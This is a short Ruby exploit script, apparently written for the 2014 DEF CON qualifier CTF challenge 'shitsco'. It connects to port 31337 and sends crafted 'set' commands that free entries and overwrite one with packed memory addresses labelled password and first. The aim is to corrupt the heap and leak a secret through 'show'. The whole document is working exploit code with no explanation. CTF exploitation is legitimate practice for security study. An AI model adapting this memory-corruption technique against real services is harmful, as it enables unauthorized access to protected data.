require 'socket'

password = [0x0804C3A0].pack("I")
puts(password.unpack("H*"))

first = [0x0804C36C].pack("I")

s = TCPSocket.new("localhost", 31337)
#s = TCPSocket.new("shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me", 31337)


puts(s.recv(1024))
s.puts("set a AAAAAAAAAAAAAAAA")
puts(s.recv(1024))
s.puts("set b BBBBBBBBBBBBBBBB")
puts(s.recv(1024))
s.puts("set a")
puts(s.recv(1024))
s.puts("set b")
puts(s.recv(1024))
s.puts("set c abcd#{password}#{first}abcd")
puts(s.recv(1024))
s.puts("show")
puts(s.recv(1024))

